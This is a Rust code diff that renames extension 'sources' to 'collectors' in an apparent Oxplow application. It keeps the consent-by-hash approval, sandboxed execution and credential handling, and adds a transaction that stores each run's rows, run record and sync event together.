@@ -1,6 +1,7 @@
-//! Running extension-declared sources: consent, exec, coercion, storage.
+//! Running collectors (P7.B3): consent, exec, coercion, storage, the
+//! run's record.
 //!
-//! An `exec` source is a program an extension ships. It runs only
+//! An `exec` collector is a program an extension ships. It runs only
 //! after a human approved that exact entry script (by content hash);
 //! approvals live in this machine's `exec_consent::ApprovalStore`, outside
 //! the repo, so each person consents on their own machine and again
@@ -8,7 +9,7 @@
 //! environment (PATH, HOME, the declared `env` names, its declared
 //! `credentials` from the keychain, OXPLOW_* context) and must print `{"entities": {"<name>": [ {col: value, …}, … ]}}`.
 //!
-//! A `starlark` / `jaq` source is *derived*: its script gets the rows of
+//! A `starlark` / `jaq` collector is *derived*: its script gets the rows of
 //! its read-only SQL `input` as `{"rows": [...]}` and returns the same
 //! shape, in the collector sandbox (no files, network, env or secrets), so
 //! it needs no approval.
@@ -16,7 +17,11 @@
 //! With `sync: upsert` the output may also carry
 //! `"deleted": {"<name>": [key, …]}`; rows update by key and an entity the
 //! run doesn't mention is left alone.
-//! See `.context/semantic-layer.md` → "User and extension sources".
+//!
+//! A run commits its rows, its `collector_run` row and its
+//! `collector.synced@1` event in one transaction; a failed run records
+//! the failure the same way. See `.context/semantic-layer.md` →
+//! "Collectors".
 
 use std::collections::BTreeMap;
 use std::path::{Path, PathBuf};
@@ -24,16 +29,20 @@ use std::sync::Arc;
 use std::time::Duration;
 
 use oxplow_ai::secrets::SecretStore;
-use oxplow_db::{EntityTable, EntityWrite, SourceState, SqlCell, SqliteExtSourceStore, StoredType};
-use oxplow_domain::DomainError;
+use oxplow_config::collectors::{
+    CollectorRuntime, CollectorSpec, CollectorSync, ColumnType, EntityDecl, Trigger,
+};
+use oxplow_db::{
+    CollectorRun, EntityTable, EntityWrite, SqlCell, SqliteCollectorStore, StoredType,
+};
+use oxplow_domain::events::schema::{CollectorSynced, CollectorSyncedV1, EventSchemaRegistry};
+use oxplow_domain::{DomainError, Envelope};
 use schemars::JsonSchema;
 use serde::{Deserialize, Serialize};
 
-use crate::extension_sources::{ColumnType, SourceEntity, SourceRuntime, SourceSpec, SourceSync};
-
-/// How long a source may run.
-pub const SOURCE_TIMEOUT: Duration = Duration::from_secs(120);
-/// Largest stdout a source may produce.
+/// How long a collector may run.
+pub const COLLECTOR_TIMEOUT: Duration = Duration::from_secs(120);
+/// Largest stdout a collector may produce.
 pub const MAX_OUTPUT_BYTES: usize = 64 * 1024 * 1024;
 /// Local (gitignored) consent file under `.oxplow/` (see `exec_consent`).
 pub use crate::exec_consent::LEGACY_APPROVALS_FILE;
@@ -41,29 +50,30 @@ pub use crate::exec_consent::LEGACY_APPROVALS_FILE;
 /// Outcome of one run, as reported to the UI / agent.
 #[derive(Debug, Clone, PartialEq, Serialize, Deserialize, specta::Type)]
 #[serde(rename_all = "camelCase")]
-pub struct SourceRunReport {
-    pub extension: String,
-    pub source_id: String,
+pub struct CollectorRunReport {
+    pub owner: String,
+    pub id: String,
     pub row_counts: BTreeMap<String, i64>,
 }
 
-/// A declared source with its last run and consent status.
+/// A declared collector with its last run and consent status.
 #[derive(Debug, Clone, PartialEq, Serialize, Deserialize, specta::Type)]
 #[serde(rename_all = "camelCase")]
-pub struct SourceListing {
-    pub extension: String,
-    pub spec: SourceSpec,
-    pub state: Option<SourceState>,
+pub struct CollectorListing {
+    /// The extension that declares it.
+    pub owner: String,
+    pub spec: CollectorSpec,
+    pub run: Option<CollectorRun>,
     /// This machine approved the entry script (and its `network` list) as
     /// it is now.
     pub approved: bool,
-    /// Whether this OS enforces the source's `network` list.
+    /// Whether this OS enforces the collector's `network` list.
     pub network_enforced: bool,
     /// Each declared credential and whether it has a value (never the value).
     pub credentials: Vec<CredentialStatus>,
     /// Its approval hash as it is now: the person's Approve & Run sends
-    /// back the version they reviewed (tsk349). `None` for derived sources
-    /// and unreadable entries.
+    /// back the version they reviewed (tsk349). `None` for derived
+    /// collectors and unreadable entries.
     pub version: Option<String>,
 }
 
@@ -74,32 +84,37 @@ pub struct CredentialStatus {
     pub set: bool,
 }
 
-/// Where sources live and what running them needs.
-pub struct Sources<'a> {
+/// Where collectors live and what running them needs.
+pub struct Collectors<'a> {
     /// The worktree whose `oxplow/extensions/` declares them.
     pub root: &'a Path,
     /// This project's key ([`project_key`]): credentials are scoped by it.
     pub project: String,
     /// This machine's approvals (outside the repo, see `exec_consent`).
     pub approvals: &'a crate::exec_consent::ApprovalStore,
-    pub store: &'a SqliteExtSourceStore,
+    pub store: &'a SqliteCollectorStore,
+    /// What a run commits its rows, run state and event through.
+    pub db: oxplow_db::Database,
+    pub schemas: Arc<EventSchemaRegistry>,
     /// Where credential values are kept (the OS keychain in the app).
     pub secrets: &'a dyn SecretStore,
-    /// What a derived source's `input` is read through.
+    /// What a derived collector's `input` is read through.
     pub layer: crate::sql_gateway::SqlGateway,
     /// The loaded-extensions cache (`Services.extension_catalog`).
     pub catalog: &'a crate::extension_catalog::ExtensionCatalog,
-    /// What a derived source's `ai_*` builtins ask (recorded computations).
+    /// What a derived collector's `ai_*` builtins ask (recorded computations).
     pub ai: std::sync::Arc<crate::ai_compute::AiCompute>,
 }
 
-impl<'a> Sources<'a> {
+impl<'a> Collectors<'a> {
     pub fn of(svc: &'a crate::Services, root: &'a Path) -> Self {
-        Sources {
+        Collectors {
             root,
             project: project_key(&svc.layout.project_dir),
             approvals: &svc.approvals,
-            store: &svc.ext_source_store,
+            store: &svc.collector_store,
+            db: svc.db.clone(),
+            schemas: svc.event_log_store.schemas().clone(),
             secrets: svc.secrets.as_ref(),
             layer: svc.sql.clone(),
             catalog: &svc.extension_catalog,
@@ -126,11 +141,11 @@ pub fn credential_account(project: &str, extension: &str, name: &str) -> String 
     format!("source:{project}:{extension}:{name}")
 }
 
-/// Set (or with `None`, clear) a credential some source or provider of
+/// Set (or with `None`, clear) a credential some collector or provider of
 /// `extension` declares (both read the same keychain account). For the
 /// person, from the UI; agents can't reach this.
-pub fn set_source_credential(
-    ctx: &Sources<'_>,
+pub fn set_credential(
+    ctx: &Collectors<'_>,
     extension: &str,
     name: &str,
     value: Option<&str>,
@@ -143,14 +158,14 @@ pub fn set_source_credential(
         .cloned()
         .ok_or(DomainError::NotFound)?;
     let declared = ext
-        .sources
+        .collectors
         .iter()
         .flat_map(|s| s.credentials.iter())
         .chain(ext.providers.iter().flat_map(|p| p.credentials.iter()))
         .any(|c| c == name);
     if !declared {
         return Err(DomainError::Invalid(format!(
-            "no source or provider in `{extension}` declares a credential named `{name}`"
+            "no collector or provider in `{extension}` declares a credential named `{name}`"
         )));
     }
     let account = credential_account(&ctx.project, extension, name);
@@ -161,14 +176,14 @@ pub fn set_source_credential(
     result.map_err(|e| DomainError::Storage(e.to_string()))
 }
 
-/// Every declared source under `root`, with state and consent.
-pub async fn list_sources(ctx: &Sources<'_>) -> Result<Vec<SourceListing>, DomainError> {
-    let states = ctx.store.list_states().await?;
+/// Every declared collector under `root`, with its last run and consent.
+pub async fn list_collectors(ctx: &Collectors<'_>) -> Result<Vec<CollectorListing>, DomainError> {
+    let runs = ctx.store.list_runs().await?;
     let mut out = Vec::new();
     for ext in ctx.catalog.get(ctx.root).iter().cloned() {
         let ext_dir = ctx.root.join(&ext.path);
-        for spec in ext.sources {
-            // A derived source can't do anything an approval would guard.
+        for spec in ext.collectors {
+            // A derived collector can't do anything an approval would guard.
             let version = (!spec.runtime.is_derived())
                 .then(|| approval_hash(&ext_dir, &spec).ok())
                 .flatten();
@@ -176,9 +191,9 @@ pub async fn list_sources(ctx: &Sources<'_>) -> Result<Vec<SourceListing>, Domai
                 || version
                     .as_ref()
                     .is_some_and(|h| is_approved(ctx.approvals, &ext.name, &spec.id, h));
-            let state = states
+            let run = runs
                 .iter()
-                .find(|s| s.extension == ext.name && s.source_id == spec.id)
+                .find(|r| r.owner == ext.name && r.id == spec.id)
                 .cloned();
             let credentials = spec
                 .credentials
@@ -193,10 +208,10 @@ pub async fn list_sources(ctx: &Sources<'_>) -> Result<Vec<SourceListing>, Domai
                         .is_some(),
                 })
                 .collect();
-            out.push(SourceListing {
-                extension: ext.name.clone(),
+            out.push(CollectorListing {
+                owner: ext.name.clone(),
                 spec,
-                state,
+                run,
                 approved,
                 network_enforced: crate::net_sandbox::enforced(),
                 credentials,
@@ -207,16 +222,16 @@ pub async fn list_sources(ctx: &Sources<'_>) -> Result<Vec<SourceListing>, Domai
     Ok(out)
 }
 
-/// Sources the scheduler should run now: approved `every` sources that
-/// never ran or last ran at least their interval before `now_ms`.
-pub fn due_sources(listings: &[SourceListing], now_ms: i64) -> Vec<(String, String)> {
+/// Collectors the scheduler should run now: approved `every` collectors
+/// that never ran or last ran at least their interval before `now_ms`.
+pub fn due_collectors(listings: &[CollectorListing], now_ms: i64) -> Vec<(String, String)> {
     listings
         .iter()
         .filter(|l| l.approved)
-        .filter(|l| match l.spec.schedule {
-            crate::extension_sources::SourceSchedule::Manual => false,
-            crate::extension_sources::SourceSchedule::Every { minutes } => {
-                let last_ms = l.state.as_ref().and_then(|s| {
+        .filter(|l| match l.spec.trigger {
+            Trigger::Manual | Trigger::On { .. } => false,
+            Trigger::Every { minutes } => {
+                let last_ms = l.run.as_ref().and_then(|s| {
                     serde_json::from_value::<oxplow_domain::Timestamp>(serde_json::Value::String(
                         s.last_run_at.clone(),
                     ))
@@ -226,43 +241,43 @@ pub fn due_sources(listings: &[SourceListing], now_ms: i64) -> Vec<(String, Stri
                 last_ms.is_none_or(|last| now_ms - last >= i64::from(minutes) * 60_000)
             }
         })
-        .map(|l| (l.extension.clone(), l.spec.id.clone()))
+        .map(|l| (l.owner.clone(), l.spec.id.clone()))
         .collect()
 }
 
-/// Run every due source (see [`due_sources`]) from the primary worktree,
-/// each as the `source.sync` command run by the system — the one way a
-/// source runs, so a scheduled run is audited and logs `command.executed`
-/// like one from the UI, a lens action or MCP. Unapproved sources never
-/// run here: the command refuses them. Returns what it ran; a failed run
+/// Run every due collector (see [`due_collectors`]) from the primary
+/// worktree, each as the `collector.sync` command run by the system — so a
+/// scheduled run is audited and logs `command.executed` like one from the
+/// UI, a lens action or MCP. Unapproved collectors never run here: the
+/// command refuses them. Returns what it ran; a failed run
 /// is logged and the rest still run.
-pub async fn run_due_sources(state: &crate::Services) -> Vec<(String, String)> {
+pub async fn run_due_collectors(state: &crate::Services) -> Vec<(String, String)> {
     let root = state.worktrees.resolve(None).await;
-    let Ok(listings) = list_sources(&Sources::of(state, &root)).await else {
+    let Ok(listings) = list_collectors(&Collectors::of(state, &root)).await else {
         return vec![];
     };
     let now = oxplow_domain::Timestamp::now().unix_ms();
-    let due = due_sources(&listings, now);
-    for (extension, source_id) in &due {
-        let input = serde_json::json!({ "extension": extension, "source": source_id });
+    let due = due_collectors(&listings, now);
+    for (owner, id) in &due {
+        let input = serde_json::json!({ "owner": owner, "id": id });
         if let Err(e) = state
             .commands
             .run(&oxplow_domain::Actor::System, SYNC, input, false)
             .await
         {
-            tracing::warn!(%extension, %source_id, error = ?e, "scheduled source run failed");
+            tracing::warn!(%owner, %id, error = ?e, "scheduled collector run failed");
         }
     }
     due
 }
 
-/// Background loop: once a minute, [`run_due_sources`].
+/// Background loop: once a minute, [`run_due_collectors`].
 pub fn spawn_scheduler(state: std::sync::Arc<crate::Services>) {
     tokio::spawn(async move {
         // Stay out of boot's way.
         tokio::time::sleep(Duration::from_secs(30)).await;
         loop {
-            run_due_sources(&state).await;
+            run_due_collectors(&state).await;
             tokio::time::sleep(Duration::from_secs(60)).await;
         }
     });
@@ -279,14 +294,15 @@ pub fn entry_hash(ext_dir: &Path, entry: &str) -> std::io::Result<String> {
 /// any helper it runs, tsk347) and the hosts it may reach (tsk324), so a
 /// changed helper or a widened `network` needs approving again.
 ///
-/// The manifest and lenses aren't code the source runs, so editing a lens
-/// doesn't ask again; what the manifest grants the source (its entry,
+/// The manifest and lenses aren't code the collector runs, so editing a
+/// lens doesn't ask again; what the manifest grants it (its entry,
 /// env passthrough, credentials and network, tsk348) is hashed from the
 /// spec instead.
-pub fn approval_hash(ext_dir: &Path, spec: &SourceSpec) -> std::io::Result<String> {
+pub fn approval_hash(ext_dir: &Path, spec: &CollectorSpec) -> std::io::Result<String> {
     use sha2::{Digest, Sha256};
     // The entry must exist; the tree hash alone wouldn't notice a typo.
-    entry_hash(ext_dir, &spec.entry)?;
+    let entry = entry_of(spec);
+    entry_hash(ext_dir, entry)?;
     let tree = crate::exec_consent::tree_hash_except(ext_dir, &|rel| {
         rel == Path::new("extension.yaml") || rel.starts_with("lenses")
     })?;
@@ -297,7 +313,7 @@ pub fn approval_hash(ext_dir: &Path, spec: &SourceSpec) -> std::io::Result<Strin
     };
     let text = format!(
         "tree:{tree}\nentry:{}\nenv:{}\ncredentials:{}\nnetwork:{}",
-        spec.entry,
+        entry,
         sorted(&spec.env),
         sorted(&spec.credentials),
         sorted(&spec.network)
@@ -305,7 +321,13 @@ pub fn approval_hash(ext_dir: &Path, spec: &SourceSpec) -> std::io::Result<Strin
     Ok(hex::encode(Sha256::digest(text.as_bytes())))
 }
 
-/// How an exec source may reach the network.
+/// A program or script collector's entry (`parse_collectors` requires one
+/// for every runtime but `read`, which never gets here).
+fn entry_of(spec: &CollectorSpec) -> &str {
+    spec.entry.as_deref().unwrap_or_default()
+}
+
+/// How an exec collector may reach the network.
 #[derive(Debug, Clone)]
 pub enum Egress {
     /// Unrestricted: an OS without enforcement, and tests of exec itself.
@@ -315,43 +337,43 @@ pub enum Egress {
     Sandboxed { proxy_env: Vec<(String, String)> },
 }
 
-/// Whether `extension/source` is approved for this exact entry hash.
+/// Whether `owner/id` is approved for this exact entry hash.
 pub fn is_approved(
     approvals: &crate::exec_consent::ApprovalStore,
-    extension: &str,
-    source: &str,
+    owner: &str,
+    id: &str,
     hash: &str,
 ) -> bool {
-    approvals.is_approved(&format!("{extension}/{source}"), hash)
+    approvals.is_approved(&format!("{owner}/{id}"), hash)
 }
 
-/// Record a human's approval of `extension/source` at `hash`.
+/// Record a human's approval of `owner/id` at `hash`.
 pub fn approve(
     approvals: &crate::exec_consent::ApprovalStore,
-    extension: &str,
-    source: &str,
+    owner: &str,
+    id: &str,
     hash: &str,
 ) -> std::io::Result<()> {
-    approvals.approve(&format!("{extension}/{source}"), hash)
+    approvals.approve(&format!("{owner}/{id}"), hash)
 }
 
-/// What a source run returns: rows per entity, and (with `sync: upsert`)
+/// What a collector run returns: rows per entity, and (with `sync: upsert`)
 /// the keys to remove per entity.
 #[derive(Debug, Deserialize)]
 #[serde(deny_unknown_fields)]
-pub struct SourceOutput {
+pub struct ScriptOutput {
     pub entities: BTreeMap<String, Vec<serde_json::Value>>,
     #[serde(default)]
     pub deleted: BTreeMap<String, Vec<serde_json::Value>>,
 }
 
-impl SourceOutput {
+impl ScriptOutput {
     /// Parse and check against the declaration: only declared entities,
-    /// and tombstones only for an upsert source.
-    fn parse(spec: &SourceSpec, value: serde_json::Value) -> Result<Self, String> {
-        let out: SourceOutput = serde_json::from_value(value).map_err(|e| {
+    /// and tombstones only for an upsert collector.
+    fn parse(spec: &CollectorSpec, value: serde_json::Value) -> Result<Self, String> {
+        let out: ScriptOutput = serde_json::from_value(value).map_err(|e| {
             format!(
-                "source `{}` must return JSON like {{\"entities\": {{\"<name>\": [...]}}}}: {e}",
+                "collector `{}` must return JSON like {{\"entities\": {{\"<name>\": [...]}}}}: {e}",
                 spec.id
             )
         })?;
@@ -362,13 +384,13 @@ impl SourceOutput {
             .find(|k| !spec.entities.iter().any(|e| &e.name == *k))
         {
             return Err(format!(
-                "source `{}` returned undeclared entity `{unknown}`",
+                "collector `{}` returned undeclared entity `{unknown}`",
                 spec.id
             ));
         }
-        if !out.deleted.is_empty() && spec.sync != SourceSync::Upsert {
+        if !out.deleted.is_empty() && spec.sync != CollectorSync::Upsert {
             return Err(format!(
-                "source `{}` returned `deleted`, which needs `sync: upsert`",
+                "collector `{}` returned `deleted`, which needs `sync: upsert`",
                 spec.id
             ));
         }
@@ -377,22 +399,22 @@ impl SourceOutput {
 }
 
 /// Run the entry and return its raw rows per entity.
-pub fn exec_source(
+pub fn exec_collector(
     ext_dir: &Path,
-    spec: &SourceSpec,
+    spec: &CollectorSpec,
     host_env: &dyn Fn(&str) -> Option<String>,
     credentials: &BTreeMap<String, String>,
     timeout: Duration,
     egress: &Egress,
-) -> Result<SourceOutput, String> {
+) -> Result<ScriptOutput, String> {
     use std::io::Read;
     use std::process::{Command, Stdio};
 
-    let entry = ext_dir.join(&spec.entry);
+    let entry = ext_dir.join(entry_of(spec));
     if !entry.is_file() {
         return Err(format!(
             "entry `{}` doesn't exist in the extension folder",
-            spec.entry
+            entry_of(spec)
         ));
     }
     let mut cmd = match egress {
@@ -409,7 +431,7 @@ pub fn exec_source(
         .stdout(Stdio::piped())
         .stderr(Stdio::piped())
         .env("OXPLOW_EXTENSION_DIR", ext_dir)
-        .env("OXPLOW_SOURCE_ID", &spec.id);
+        .env("OXPLOW_COLLECTOR_ID", &spec.id);
     for name in ["PATH", "HOME"] {
         if let Some(v) = host_env(name) {
             cmd.env(name, v);
@@ -430,9 +452,9 @@ pub fn exec_source(
     }
     let mut child = cmd
         .spawn()
-        .map_err(|e| format!("couldn't start `{}`: {e}", spec.entry))?;
+        .map_err(|e| format!("couldn't start `{}`: {e}", entry_of(spec)))?;
 
-    // Drain both pipes on threads so a chatty source can't deadlock.
+    // Drain both pipes on threads so a chatty program can't deadlock.
     let mut out_pipe = child.stdout.take().ok_or("no stdout")?;
     let mut err_pipe = child.stderr.take().ok_or("no stderr")?;
     let out_thread = std::thread::spawn(move || {
@@ -456,7 +478,10 @@ pub fn exec_source(
             None if started.elapsed() >= timeout => {
                 let _ = child.kill();
                 let _ = child.wait();
-                return Err(format!("source `{}` timed out after {timeout:?}", spec.id));
+                return Err(format!(
+                    "collector `{}` timed out after {timeout:?}",
+                    spec.id
+                ));
             }
             None => std::thread::sleep(Duration::from_millis(25)),
         }
@@ -467,34 +492,34 @@ pub fn exec_source(
         .to_string();
     if !status.success() {
         return Err(format!(
-            "source `{}` failed ({status}, exit code {:?}): {stderr}",
+            "collector `{}` failed ({status}, exit code {:?}): {stderr}",
             spec.id,
             status.code()
         ));
     }
     if stdout.len() > MAX_OUTPUT_BYTES {
         return Err(format!(
-            "source `{}` printed more than {MAX_OUTPUT_BYTES} bytes",
+            "collector `{}` printed more than {MAX_OUTPUT_BYTES} bytes",
             spec.id
         ));
     }
     let value: serde_json::Value = serde_json::from_slice(&stdout).map_err(|e| {
         format!(
-            "source `{}` must print JSON like {{\"entities\": {{\"<name>\": [...]}}}}: {e}",
+            "collector `{}` must print JSON like {{\"entities\": {{\"<name>\": [...]}}}}: {e}",
             spec.id
         )
     })?;
-    SourceOutput::parse(spec, value)
+    ScriptOutput::parse(spec, value)
 }
 
-/// Run a derived (starlark / jaq) source: read its `input` rows, then run
+/// Run a derived (starlark / jaq) collector: read its `input` rows, then run
 /// its script over `{"rows": [...]}` in the collector sandbox.
-pub async fn derive_source(
+pub async fn derive_collector(
     layer: &crate::sql_gateway::SqlGateway,
     script: String,
-    spec: &SourceSpec,
+    spec: &CollectorSpec,
     oracle: std::sync::Arc<dyn oxplow_collect_plugin::AiOracle>,
-) -> Result<SourceOutput, String> {
+) -> Result<ScriptOutput, String> {
     let rows = match &spec.input {
         None => Vec::new(),
         Some(sql) => {
@@ -502,10 +527,10 @@ pub async fn derive_source(
             let out = layer
                 .query_sql(sql, vec![], Some(limit))
                 .await
-                .map_err(|e| format!("source `{}` input: {e}", spec.id))?;
+                .map_err(|e| format!("collector `{}` input: {e}", spec.id))?;
             if out.truncated {
                 return Err(format!(
-                    "source `{}` input returned more than {limit} rows; narrow it",
+                    "collector `{}` input returned more than {limit} rows; narrow it",
                     spec.id
                 ));
             }
@@ -536,19 +561,19 @@ pub async fn derive_source(
         let host = std::sync::Arc::new(oxplow_collect_plugin::AiHost::new(oracle));
         let clock = host.clock();
         run_sandboxed_excluding(&SandboxBudget::default(), &clock, move || match runtime {
-            SourceRuntime::Jaq => run_jaq(&script, &input),
+            CollectorRuntime::Jaq => run_jaq(&script, &input),
             _ => run_starlark_with_ai(&script, &input, &host),
         })
     })
     .await
-    .map_err(|e| format!("source task panicked: {e}"))?
-    .map_err(|e| format!("source `{}`: {e}", spec.id))?;
-    SourceOutput::parse(spec, value)
+    .map_err(|e| format!("collector task panicked: {e}"))?
+    .map_err(|e| format!("collector `{}`: {e}", spec.id))?;
+    ScriptOutput::parse(spec, value)
 }
 
 /// Coerce raw JSON rows to the entity's declared columns (in order).
 pub fn coerce_rows(
-    entity: &SourceEntity,
+    entity: &EntityDecl,
     rows: Vec<serde_json::Value>,
 ) -> Result<Vec<Vec<SqlCell>>, String> {
     use serde_json::Value;
@@ -598,71 +623,201 @@ fn stored(t: ColumnType) -> StoredType {
     }
 }
 
-/// Why a source run didn't produce data.
+/// Why a collector run didn't produce data.
 #[derive(Debug)]
-pub enum RunSourceError {
-    /// No such extension or source.
+pub enum RunCollectorError {
+    /// No such owner or collector.
     NotFound,
     /// Nobody on this machine approved the current entry script. Nothing ran.
     NeedsApproval(String),
-    /// It ran (or tried to) and failed; recorded as the source's state.
+    /// It ran (or tried to) and failed; recorded as its run.
     Failed(String),
     /// Oxplow's own storage failed.
     Storage(DomainError),
 }
 
-impl RunSourceError {
-    /// Whether the source actually ran, so its data/state changed.
-    pub fn ran(&self) -> bool {
-        matches!(self, RunSourceError::Failed(_))
-    }
-}
-
-impl From<RunSourceError> for DomainError {
-    fn from(e: RunSourceError) -> Self {
+impl From<RunCollectorError> for DomainError {
+    fn from(e: RunCollectorError) -> Self {
         match e {
-            RunSourceError::NotFound => DomainError::NotFound,
-            RunSourceError::NeedsApproval(m) | RunSourceError::Failed(m) => DomainError::Invalid(m),
-            RunSourceError::Storage(e) => e,
+            RunCollectorError::NotFound => DomainError::NotFound,
+            RunCollectorError::NeedsApproval(m) | RunCollectorError::Failed(m) => {
+                DomainError::Invalid(m)
+            }
+            RunCollectorError::Storage(e) => e,
         }
     }
 }
 
-/// Run one source end to end: consent check (recording approval when a
-/// person passed the `approve` version they reviewed, tsk349), exec,
-/// coercion, atomic store, run state.
-/// Failures after the consent check are also recorded as the source's
-/// state so the UI can show them.
-pub async fn run_source(
-    ctx: &Sources<'_>,
-    extension: &str,
-    source_id: &str,
-) -> Result<SourceRunReport, RunSourceError> {
-    let (spec, output) = produce(ctx, extension, source_id).await?;
-    let result = match output {
-        Ok(output) => store_output(extension, &spec, output, ctx.store).await,
-        Err(e) => Err(e),
+/// What ran a collector: `collector.sync` by hand, its `every:` schedule.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum RunTrigger {
+    Manual,
+    Every,
+}
+
+impl RunTrigger {
+    fn name(self) -> &'static str {
+        match self {
+            RunTrigger::Manual => "manual",
+            RunTrigger::Every => "every",
+        }
+    }
+}
+
+/// Run one collector end to end: consent check, run, coercion, then one
+/// transaction with its rows, its `collector_run` row and its
+/// `collector.synced@1` event (logged as `source`). A run that fails after
+/// the consent check is recorded the same way, without rows, so the UI
+/// can show it.
+pub async fn run_collector(
+    ctx: &Collectors<'_>,
+    owner: &str,
+    id: &str,
+    trigger: RunTrigger,
+    source: &str,
+) -> Result<CollectorRunReport, RunCollectorError> {
+    let started = std::time::Instant::now();
+    let (spec, output) = produce(ctx, owner, id).await?;
+    let writes = output.and_then(|o| plan_writes(owner, &spec, o));
+    let run = |status: &str, error: Option<String>| CollectorRun {
+        owner: owner.to_string(),
+        id: id.to_string(),
+        status: status.into(),
+        last_run_at: now_rfc3339(),
+        error,
+        row_counts: BTreeMap::new(),
+        cursor: None,
+        last_event_id: None,
     };
-    record(ctx.store, extension, source_id, result).await
+    let collector = oxplow_domain::refs::build::collector_ref(owner, id);
+    let event = Synced {
+        source: source.to_string(),
+        collector,
+        trigger,
+    };
+    let error = match writes {
+        Ok(writes) => {
+            let names: Vec<String> = writes.iter().map(|(t, _)| t.entity.clone()).collect();
+            let ok_run = run("ok", None);
+            let schemas = ctx.schemas.clone();
+            let event = event.clone();
+            let elapsed = elapsed_ms(started);
+            let committed = ctx
+                .db
+                .transaction(move |tx| {
+                    let counts: BTreeMap<String, i64> = names
+                        .iter()
+                        .cloned()
+                        .zip(oxplow_db::collector_store::write_rows_tx(tx, &writes)?)
+                        .collect();
+                    let run = CollectorRun {
+                        row_counts: counts.clone(),
+                        ..ok_run.clone()
+                    };
+                    oxplow_db::collector_store::record_run_in(tx, &run)
+                        .map_err(oxplow_db::map_sql_err)?;
+                    oxplow_db::event_log_store::append_tx(
+                        tx,
+                        &schemas,
+                        &event.envelope("ok", counts.clone(), elapsed, None),
+                    )?;
+                    Ok(counts)
+                })
+                .await;
+            match committed {
+                Ok(row_counts) => {
+                    return Ok(CollectorRunReport {
+                        owner: owner.to_string(),
+                        id: id.to_string(),
+                        row_counts,
+                    })
+                }
+                Err(e) => e.to_string(),
+            }
+        }
+        Err(e) => e,
+    };
+    let failed = run("error", Some(error.clone()));
+    let envelope = event.envelope(
+        "error",
+        BTreeMap::new(),
+        elapsed_ms(started),
+        Some(error.clone()),
+    );
+    let schemas = ctx.schemas.clone();
+    ctx.db
+        .transaction(move |tx| {
+            oxplow_db::collector_store::record_run_in(tx, &failed)
+                .map_err(oxplow_db::map_sql_err)?;
+            oxplow_db::event_log_store::append_tx(tx, &schemas, &envelope).map(|_| ())
+        })
+        .await
+        .map_err(RunCollectorError::Storage)?;
+    Err(RunCollectorError::Failed(error))
+}
+
+/// What a run's `collector.synced@1` says about who ran which collector.
+#[derive(Clone)]
+struct Synced {
+    source: String,
+    /// `collector:<owner>/<id>`.
+    collector: String,
+    trigger: RunTrigger,
+}
+
+impl Synced {
+    fn envelope(
+        &self,
+        status: &str,
+        entities: BTreeMap<String, i64>,
+        elapsed_ms: i64,
+        error: Option<String>,
+    ) -> Envelope {
+        Envelope::typed::<CollectorSynced>(
+            self.source.clone(),
+            &CollectorSyncedV1 {
+                collector: self.collector.clone(),
+                trigger: self.trigger.name().into(),
+                status: status.into(),
+                entities,
+                facts: 0,
+                elapsed_ms,
+                error,
+            },
+        )
+        .with_subject([self.collector.clone()])
+    }
+}
+
+fn elapsed_ms(started: std::time::Instant) -> i64 {
+    i64::try_from(started.elapsed().as_millis()).unwrap_or(i64::MAX)
+}
+
+/// Now as RFC 3339, as `Timestamp` serializes.
+fn now_rfc3339() -> String {
+    serde_json::to_value(oxplow_domain::Timestamp::now())
+        .ok()
+        .and_then(|v| v.as_str().map(str::to_string))
+        .unwrap_or_default()
 }
 
 /// Rows per entity a preview shows.
 const PREVIEW_ROWS: usize = 50;
 
-/// What a source would store, without storing it or recording a run:
-/// how an agent checks a source it's writing in a worktree stream
-/// (source data is project-wide, so a real run there would overwrite the
-/// project's rows, tsk377). The same consent applies: an exec source
-/// runs only at a version a person approved.
+/// What a collector would store, without storing it or recording a run:
+/// how an agent checks a collector it's writing in a worktree stream
+/// (collected data is project-wide, so a real run there would overwrite
+/// the project's rows, tsk377). The same consent applies: an exec
+/// collector runs only at a version a person approved.
 #[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
 #[serde(rename_all = "camelCase")]
-pub struct SourcePreview {
-    pub extension: String,
-    pub source_id: String,
+pub struct CollectorPreview {
+    pub owner: String,
+    pub id: String,
     pub entities: Vec<EntityPreview>,
 }
 
-/// One entity of a [`SourcePreview`]: its first rows, coerced to the
+/// One entity of a [`CollectorPreview`]: its first rows, coerced to the
 /// declared columns.
 #[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
 #[serde(rename_all = "camelCase")]
@@ -678,15 +833,15 @@ pub struct EntityPreview {
     pub deleted: usize,
 }
 
-/// Run a source and return what it would store (see [`SourcePreview`]).
-pub async fn preview_source(
-    ctx: &Sources<'_>,
-    extension: &str,
-    source_id: &str,
-) -> Result<SourcePreview, RunSourceError> {
-    let (spec, output) = produce(ctx, extension, source_id).await?;
-    let writes = plan_writes(extension, &spec, output.map_err(RunSourceError::Failed)?)
-        .map_err(RunSourceError::Failed)?;
+/// Run a collector and return what it would store (see [`CollectorPreview`]).
+pub async fn preview_collector(
+    ctx: &Collectors<'_>,
+    owner: &str,
+    id: &str,
+) -> Result<CollectorPreview, RunCollectorError> {
+    let (spec, output) = produce(ctx, owner, id).await?;
+    let writes = plan_writes(owner, &spec, output.map_err(RunCollectorError::Failed)?)
+        .map_err(RunCollectorError::Failed)?;
     let entities = writes
         .into_iter()
         .map(|(table, write)| {
@@ -704,97 +859,111 @@ pub async fn preview_source(
             }
         })
         .collect();
-    Ok(SourcePreview {
-        extension: extension.to_string(),
-        source_id: source_id.to_string(),
+    Ok(CollectorPreview {
+        owner: owner.to_string(),
+        id: id.to_string(),
         entities,
     })
 }
 
-/// The extension and spec of source `extension/source_id` in `ctx.root`.
-fn find_source(
-    ctx: &Sources<'_>,
-    extension: &str,
-    source_id: &str,
-) -> Result<(crate::extensions::Extension, SourceSpec), RunSourceError> {
+/// The extension and spec of collector `owner/id` in `ctx.root`.
+fn find_collector(
+    ctx: &Collectors<'_>,
+    owner: &str,
+    id: &str,
+) -> Result<(crate::extensions::Extension, CollectorSpec), RunCollectorError> {
     let ext = ctx
         .catalog
         .get(ctx.root)
         .iter()
-        .find(|e| e.name == extension)
+        .find(|e| e.name == owner)
         .cloned()
-        .ok_or(RunSourceError::NotFound)?;
+        .ok_or(RunCollectorError::NotFound)?;
     let spec = ext
-        .sources
+        .collectors
         .iter()
-        .find(|s| s.id == source_id)
+        .find(|s| s.id == id)
         .cloned()
-        .ok_or(RunSourceError::NotFound)?;
+        .ok_or(RunCollectorError::NotFound)?;
     Ok((ext, spec))
 }
 
